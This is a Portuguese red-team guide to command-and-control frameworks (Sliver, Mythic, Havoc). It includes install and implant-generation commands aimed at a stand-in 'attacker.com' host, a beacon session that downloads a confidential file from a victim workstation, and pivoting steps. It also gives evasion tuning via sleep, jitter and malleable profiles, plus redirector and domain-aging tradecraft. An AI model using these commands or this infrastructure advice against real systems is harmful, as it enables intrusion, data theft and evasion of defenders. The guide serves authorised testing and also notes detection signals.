---
title: C2 Frameworks Modernos — Sliver, Mythic, Havoc
category: auth
stack: [Sliver, Mythic, Havoc, Brute Ratel]
tags: [c2, red-team, sliver, mythic, havoc, malleable]
excerpt: Por que Cobalt Strike envelheceu mal e quais frameworks dominam red team em 2026 — Sliver, Mythic, Havoc, com configuração realista.
related: [sec-red-team-ops-2026, sec-initial-access-modern, sec-post-exploitation, sec-edr-evasion-defensive]
updated: "2026-05-10"
---

## Por que não Cobalt Strike

Cobalt Strike foi padrão da indústria de 2015-2022. Em 2026 ele:

- **Caro**: $5,900/year/user. Para consultoria pequena é proibitivo.
- **Queimado**: anti-virus detecta default beacon em milissegundos. Default malleable profiles ainda mais.
- **Cracked versions** abusadas por ransomware groups (Conti, LockBit) → AV companies aprenderam a fundo o stack.
- **Licensing antiquated** em era pós-Fortra acquisition.

Empresas legítimas ainda compram pra red team mature, mas a base open-source acompanhou.

## Sliver — o substituto open source

**Sliver** (Bishop Fox) é o C2 mais adotado em 2024-2026 fora do Cobalt Strike.

### Características

- Open source, Go.
- Multiplayer (vários operadores compartilham mesma session).
- Implants em Go (cross-platform: Linux, Windows, macOS, BSD).
- Transports: mTLS, WireGuard, HTTP(S), DNS.
- BOFs (Beacon Object Files) compatíveis com Cobalt Strike — reutiliza ecossistema.
- Armory: catálogo de extensões oficiais.

### Setup básico

```bash
# Install (Kali, Debian)
curl https://sliver.sh/install | sudo bash

# Server
sliver-server

# Em outra shell — operator client
sliver-client

# Gerar implant
> generate --mtls 192.168.50.1:8443 --os windows --arch amd64 --save .
# Output: implant_abc123.exe

# Iniciar listener
> mtls --lhost 192.168.50.1 --lport 8443

# Quando implant calls back, "sessions" lista
> sessions
> use 1
> info
> shell
```

### Implants tipos

- **Session** — interactive, beacon TCP/HTTP/DNS.
- **Beacon** — async, sleep + jitter (como Cobalt Strike beacon).

### Sliver vs Cobalt — pra que cenário

| Cenário | Recomendado |
|---------|-------------|
| Consultoria solo / pequena | Sliver (free) |
| Engagement long-term + maturity | Sliver ou Mythic |
| Cliente exige tool name reconhecível | Cobalt Strike ainda (papel comercial) |
| Stealthy, novel | Custom + Sliver/Mythic core |

## Mythic — framework modular

**Mythic** (Cody Thomas, SpecterOps) é framework com agents pluggáveis.

### Diferencial

- Web UI moderna (não Java Swing).
- Agentes: Apollo (C#/.NET Windows), Apfell (macOS/Linux Python), Poseidon (Go cross-platform), Athena (.NET cross-platform), Medusa (Python), Tetanus (Rust), e muitos community.
- Profiles: HTTP, websocket, SMB, FTP, DNS, Slack (sim — C2 via Slack channel).
- Containers Docker pra cada componente — fácil deploy.

### Setup

```bash
git clone https://github.com/its-a-feature/Mythic
cd Mythic
./mythic-cli install github https://github.com/MythicAgents/apollo
./mythic-cli install github https://github.com/MythicC2Profiles/http
./mythic-cli start

# Acessa https://localhost:7443
# Login: mythic_admin / [password gerado em .env]
```

Treinamento curva é maior que Sliver. Vale a pena pra engagement de longa duração ou ambientes hostis.

## Havoc — alternativa "bonita"

**Havoc** (Paul Ungur / @C5pider) é C2 mais novo, Go + C++ implant (Demon).

- Demon implant é em C, indirect syscalls, return address spoofing, AMSI/ETW patching default.
- Interface elegante (Qt).
- Sleep obfuscation técnicas (Ekko, FOLIAGE).
- BOFs + reflective DLL loading.

```bash
git clone https://github.com/HavocFramework/Havoc
cd Havoc
make ts-build
make client-build
make server-build

# Server
./havoc server --profile profiles/havoc.yaotl

# Client
./havoc client
```

Havoc é mais novo (2022+), comunidade ativa, mais barulhento em deteção que Sliver hoje (assinatura jovem ainda).

## Outras opções

| Framework | Notas |
|-----------|-------|
| **Empire** (BC Security fork) | PowerShell-heavy, queimado mas funciona em legacy. |
| **Brute Ratel** | Comercial, alta qualidade evasion. Caro ($2,500). Quem usa: ransomware groups (leaked). |
| **Nighthawk** (MDSec) | Comercial top-tier. ~$10k+. Boutique consulting. |
| **Covenant** | .NET-based, dormente desde 2022. |
| **Merlin** | Go-based, HTTP/2 + HTTP/3 + WebSocket. Lab quality. |
| **Metasploit** | Não é red team C2 — Meterpreter detected universalmente. Use pra pivoting/aux. |

## Malleable C2 — making traffic blend

C2 traffic precisa parecer "normal" pra evadir SOC. Malleable profiles definem:

- **Sleep + jitter**: beacon dorme 60s ± 30% → não periódico óbvio.
- **HTTP request profile**: URI path, headers, body — espelha tráfego legítimo (Office365, CDN, social media).
- **HTTP response profile**: server header, content-type, body padding.
- **Process injection**: spawn em processo específico (svchost, dllhost).

### Sliver profile example

```bash
# Generate implant com HTTP profile customizado
> profiles new --name office365-mimic --http-c2 office365-c2-profile.json
> generate --http-c2 https://attacker.com --profile office365-mimic
```

### Cobalt Strike → Sliver migration

Maioria dos malleable profiles populares (Outlook, Office365, JQuery) tem port pra Sliver.

## Operating with C2 — playbook básico

### Initial implant

1. Generate beacon com profile aprovado (não default).
2. Setup multiple redirectors (Apache mod_rewrite ou Nginx upstream) → defender vê só redirector.
3. Listener no C2 backend não exposto público.
4. Test em rede própria primeiro — confirma callback, latency, profile.

### Beacon operations

```
# Sliver shell example
> sessions -i 1
[server] sliver (CORP-WS01) > getuid
[*] CORP\jdoe
[server] sliver (CORP-WS01) > whoami
[*] CORP\jdoe
[server] sliver (CORP-WS01) > shell
[server] sliver (CORP-WS01) > netstat -a
[server] sliver (CORP-WS01) > ps -T
[server] sliver (CORP-WS01) > screenshot
[server] sliver (CORP-WS01) > download C:\Users\jdoe\Documents\confidential.docx
```

### Pivoting via Sliver

```
# Spawn outro session usando session atual como pivot
[server] sliver > use 1
> pivots tcp --bind 0.0.0.0:9090
# Em hosts internos não-internet, gera implant que conecta ao TCP listener da session 1
> generate --tcp-pivot 10.0.0.5:9090 --os windows --save .
```

### Sleep + behavioral

```
# Aumentar sleep pra reduzir detection
> reconfig --reconnect 300   # 5 min
> jitter 30                   # 30% jitter
# Beacon dorme ~3.5-6.5 minutos entre callbacks
```

## C2 detection — o que blue team olha

- **Periodic beacon**: ML detecta padrão temporal regular. → Use jitter.
- **TLS JA3/JA3S fingerprint**: certain Go libs tem JA3 distinto. → Custom TLS lib.
- **DNS C2 patterns**: muitas subdomains TXT/A queries → detected pelo volume.
- **HTTP headers**: User-Agent não-padrão, headers raros → matchea padrão de implant conhecido.
- **Process anomaly**: implant inject em processo não-típico (Excel.exe rodando cmd.exe).
- **Network egress**: workstation chamando direto pra internet em porta não-padrão = flag.

Tools defensive:
- **Surrey**'s JARM/JA3 scanning.
- **Beacon analyzer** (RITA, Zeek-based).
- **EDR baseline behavior**: CrowdStrike, SentinelOne, Microsoft Defender for Endpoint.

## Infrastructure hygiene

- **Redirector** (Apache/Nginx) entre alvo e C2 — defender bloqueia redirector domain, C2 fica intacto.
- **Domain reputation** — `expireddomains.net` pra comprar domains com idade.
- **Categorization** — proxies categorizam URLs. Domínio recém-registrado = uncategorized = bloqueado. Use serviços (proofpoint URL categorization via 3rd-party).
- **TLS cert** — Let's Encrypt funciona. Não use self-signed (red flag).
- **Auto-rotate** — Terraform spawning new VPS + redirector se C2 detectado.

## OPSEC durante operação

- Não conectar implant com mesmo IP do operador.
- VPN egress entre operador e C2 dashboard (não C2 ↔ implant — esse fica claro).
- Log tudo (audit) mas não em mesma infra.
- Sessions sleep aumentado durante feriado / fim de semana do cliente.

## Checklist de C2 setup

- [ ] Framework escolhido + licenciado/configured?
- [ ] Profile malleable customizado (não default)?
- [ ] Redirector chain configured?
- [ ] Domain registrado 2+ sem antes, categorized OK?
- [ ] TLS cert válido (não self-signed)?
- [ ] Sleep + jitter configurado pra ambiente?
- [ ] Backup C2 em standby (se principal detectado)?
- [ ] Log/audit trail capturando tudo (responsibility)?

## Leituras

- "Operator Handbook" — RTC + adversary playbooks
- Sliver wiki (github.com/BishopFox/sliver/wiki)
- Mythic docs (docs.mythic-c2.net)
- "Cobalt Strike, a Defender's Guide" — The DFIR Report
- SpecterOps Cobalt Strike research papers
- "Red Team Infrastructure Wiki" — github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki
